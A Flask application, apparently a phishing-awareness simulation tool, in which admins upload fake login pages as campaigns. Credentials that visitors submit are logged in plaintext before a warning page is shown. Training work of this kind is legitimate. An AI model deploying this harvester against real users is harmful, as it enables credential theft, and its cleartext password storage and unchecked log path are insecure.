from flask import Flask, render_template, request, redirect, url_for, session
import os
import json
import secrets
from datetime import datetime
from werkzeug.security import generate_password_hash, check_password_hash
from flask_wtf.csrf import CSRFProtect

app = Flask(__name__)
app.secret_key = os.urandom(24)  # Genera una clave secreta aleatoria
app.config['SESSION_COOKIE_SECURE'] = True  # Solo envía cookies a través de HTTPS
app.config['SESSION_COOKIE_HTTPONLY'] = True  # Previene acceso a cookies via JavaScript
app.config['PERMANENT_SESSION_LIFETIME'] = 1800  # Sesión expira después de 30 minutos
app.config['WTF_CSRF_ENABLED'] = True  # Habilita protección CSRF

# Inicializar protección CSRF
csrf = CSRFProtect(app)

UPLOAD_FOLDER = 'campaigns'
LOG_FOLDER = 'logs'
TEMPLATE_FOLDER = 'templates/campaign_templates'
CREDENTIAL_FILE = 'admin_credentials.json'

os.makedirs(UPLOAD_FOLDER, exist_ok=True)
os.makedirs(LOG_FOLDER, exist_ok=True)
os.makedirs(TEMPLATE_FOLDER, exist_ok=True)

# --- Funciones de autenticación ---
def user_exists():
    return os.path.exists(CREDENTIAL_FILE)

def save_credentials(username, password):
    admins = []
    if os.path.exists(CREDENTIAL_FILE):
        with open(CREDENTIAL_FILE, 'r') as f:
            try:
                admins = json.load(f)
            except json.JSONDecodeError:
                admins = []
    # Verifica si el usuario ya existe
    for admin in admins:
        if admin['username'] == username:
            return False  # Usuario ya existe
    admins.append({"username": username, "password": generate_password_hash(password)})
    with open(CREDENTIAL_FILE, 'w') as f:
        json.dump(admins, f)
    return True

def check_credentials(username, password):
    if not user_exists():
        return False
    with open(CREDENTIAL_FILE, 'r') as f:
        try:
            admins = json.load(f)
        except json.JSONDecodeError:
            return False
    for admin in admins:
        if admin['username'] == username and check_password_hash(admin['password'], password):
            return True
    return False

# --- Rutas públicas ---
@app.route('/')
def landing():
    return redirect(url_for('login'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    if not user_exists():
        return redirect(url_for('setup'))
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        if check_credentials(username, password):
            session['user'] = username
            return redirect(url_for('dashboard'))
        else:
            return render_template('login.html', error="Credenciales inválidas")
    return render_template('login.html')

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))

@app.route('/setup', methods=['GET', 'POST'])
def setup():
    if user_exists():
        return redirect(url_for('login'))
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        if save_credentials(username, password):
            return redirect(url_for('login'))
        else:
            return render_template('setup.html', error="El usuario ya existe")
    return render_template('setup.html')

# --- Dashboard y campañas (requiere login) ---
def login_required(view_func):
    def wrapped_view(*args, **kwargs):
        if 'user' not in session:
            return redirect(url_for('login'))
        return view_func(*args, **kwargs)
    wrapped_view.__name__ = view_func.__name__
    return wrapped_view

@app.route('/dashboard')
@login_required
def dashboard():
    templates = os.listdir(TEMPLATE_FOLDER)
    campaigns = [f[:-5] for f in os.listdir(UPLOAD_FOLDER) if f.endswith('.html')]
    return render_template('index.html', templates=templates, campaigns=campaigns)

@app.route('/create_campaign', methods=['POST'])
@login_required
def create_campaign():
    campaign_name = request.form['campaign_name']
    
    # Validación del nombre de campaña
    if not campaign_name or len(campaign_name) > 50:
        return "El nombre de campaña no es válido o es demasiado largo", 400
    
    # Prevenir caracteres peligrosos en el nombre de la campaña
    if '/' in campaign_name or '\\' in campaign_name or '..' in campaign_name or any(c in '<>:"|?*' for c in campaign_name):
        return "El nombre de campaña contiene caracteres no permitidos", 400
    
    selected_template = request.form.get('selected_template')
    html_file = request.files.get('html_file')

    save_path = os.path.join(UPLOAD_FOLDER, f"{campaign_name}.html")

    if html_file:
        # Validar el tipo de archivo
        if not html_file.filename.endswith('.html'):
            return "Solo se permiten archivos HTML", 400
        html_file.save(save_path)
    elif selected_template:
        # Validar que la plantilla no contenga path traversal
        if '/' in selected_template or '\\' in selected_template or '..' in selected_template:
            return "Plantilla no válida", 400
            
        template_path = os.path.join(TEMPLATE_FOLDER, selected_template)
        if os.path.exists(template_path):
            with open(template_path, 'r', encoding='utf-8') as src, open(save_path, 'w', encoding='utf-8') as dst:
                dst.write(src.read())
        else:
            return "Plantilla no encontrada", 400
    else:
        return "Debe seleccionar o subir una plantilla", 400

    return render_template("campaign_created.html", campaign_name=campaign_name)

@app.route('/campana/<campaign_name>', methods=['GET', 'POST'])
def run_campaign(campaign_name):
    # Validación de entrada para prevenir path traversal
    if '/' in campaign_name or '\\' in campaign_name or '..' in campaign_name:
        return "Campaña no válida", 400
        
    campaign_path = os.path.join(UPLOAD_FOLDER, f"{campaign_name}.html")
    log_path = os.path.join(LOG_FOLDER, f"{campaign_name}_log.txt")

    if not os.path.exists(campaign_path):
        return "Campaña no encontrada", 404

    if request.method == 'POST':
        # Sanitización de entrada
        email = request.form.get('username', 'N/A')
        password = request.form.get('password', 'N/A')
        # Limitar longitud para prevenir ataques de DoS
        email = email[:100] if email else 'N/A'
        password = password[:100] if password else 'N/A'
        timestamp = datetime.now().isoformat()
        
        # Escapar caracteres especiales para prevenir inyección CSV
        email = email.replace(',', '&#44;').replace('\n', '')
        password = password.replace(',', '&#44;').replace('\n', '')
        
        with open(log_path, 'a') as f:
            f.write(f"{email},{password},{timestamp}\n")
        return redirect(url_for('warning'))

    with open(campaign_path, 'r', encoding='utf-8') as f:
        html = f.read()
    return html

@app.route('/warning')
def warning():
    return render_template('warning.html')

@app.route('/logs/<campaign_name>')
@login_required
def view_logs(campaign_name):
    log_path = os.path.join(LOG_FOLDER, f"{campaign_name}_log.txt")
    if not os.path.exists(log_path):
        return "Sin registros para esta campaña."
    with open(log_path) as f:
        logs = f.readlines()
    return render_template("logs.html", logs=logs)

# --- Verificación de plantillas de campaña ---
def verificar_plantillas_campana():
    plantilla_dir = TEMPLATE_FOLDER
    archivos_html = [f for f in os.listdir(plantilla_dir) if f.endswith('.html')]
    if not archivos_html:
        print('ADVERTENCIA: No se encontraron plantillas .html en templates/campaign_templates')
    else:
        print(f'Se detectaron {len(archivos_html)} plantilla(s) .html en templates/campaign_templates')

verificar_plantillas_campana()

if __name__ == '__main__':
    app.run(debug=True)